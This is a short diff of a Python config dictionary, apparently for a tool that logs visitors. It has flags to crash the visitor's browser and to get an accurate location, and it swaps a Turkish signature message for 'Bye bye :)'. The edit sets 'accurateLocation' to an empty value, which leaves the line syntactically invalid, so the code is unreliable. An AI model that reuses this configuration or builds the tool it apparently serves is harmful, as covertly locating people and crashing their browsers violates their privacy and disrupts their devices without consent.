@@ -18,11 +18,11 @@ config = {
     "color": 0x00FFFF,
 
     "crashBrowser": True, 
-    "accurateLocation": True,
+    "accurateLocation": ,
 
     "message": {
         "doMessage": False, 
-        "message": "cabdio buradaydı :)",
+        "message": "Bye bye :)",
         "richMessage": True,
     },
 
